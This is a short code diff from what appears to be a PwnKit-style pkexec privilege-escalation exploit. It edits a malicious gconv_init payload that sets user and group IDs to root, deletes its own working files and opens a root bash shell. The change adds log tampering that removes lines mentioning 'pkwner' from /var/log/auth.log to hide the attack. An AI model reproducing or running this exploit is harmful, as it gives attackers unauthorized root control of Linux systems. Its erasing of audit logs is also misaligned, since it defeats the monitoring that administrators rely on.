@@ -27,7 +27,10 @@ void gconv(){}
 void gconv_init() {
   setgid(0);setegid(0);
   setuid(0);seteuid(0);
-  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin; rm -rf 'GCONV_PATH=.' 'pkwner' 'pkwner';/bin/bash");
+  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
+         "rm -rf 'GCONV_PATH=.' 'pkwner';"
+         "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
+         "/bin/bash");
   exit(0);
 }
 """
